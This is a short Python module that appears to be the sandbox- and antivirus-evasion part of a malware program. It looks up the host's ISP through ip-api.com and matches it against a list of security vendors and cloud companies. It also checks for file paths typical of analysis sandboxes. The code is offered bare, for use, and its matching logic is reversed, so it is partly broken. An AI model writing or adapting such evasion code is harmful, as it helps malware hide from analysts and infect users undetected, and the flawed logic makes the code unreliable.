# Import modules

import os
from json import loads
from urllib.request import urlopen


# Detect Antivirus organization by ip

organizations = (
    'microsoft',
    'google',
    'amazon',
    'facebook',
    'avast',
    'avira',
    'avg',
    'vds',
    'cisco',
    'bitdefender',
    'comodo',
    'clamwin',
    'dr.web',
    'eset',
    'grizzly',
    'kaspersky',
    'malware',
    'norton',
    'antivirus',
    'security',
    'secure',
    'defender',
    'zonealarm',
    'immunet',
    'check point',
    'f-secure',
    'f-prot',
    'frisk',
    'fortinet',
    'g data',
    'mcaffe',
    'sophos',
    'panda',
    'qihoo',
    'quick heal',
    'trend micro',
    'trustport',
    'virusblokada',
    'webroot',
    'symantec',
)


def Organization(ip=''):
 try:
  result = urlopen(f'http://ip-api.com/json/{ip}').read().decode('utf8')
 except:
  pass
 else:
  isp = loads(result)['isp'].lower()
  for organization in organizations:
   if isp in organization:
    return True
 return False



# # Detect Antivirus organization by Directories

def OrganizationPaths():

 if os.path.exists('C:\\Users\\John\\Desktop\\foobar.txt'):
  return True
 if os.path.exists('C:\\Users\\Peter Wilson\\Desktop\\Microsoft Word 2010.lnk'):
  return True
 if os.path.exists('C:\\Users\\Lisa\\Desktop'):
  return True
 if os.path.exists('C:\\Users\\Administrator\\Desktop\\decoy.cpp'):
  return True

 return False
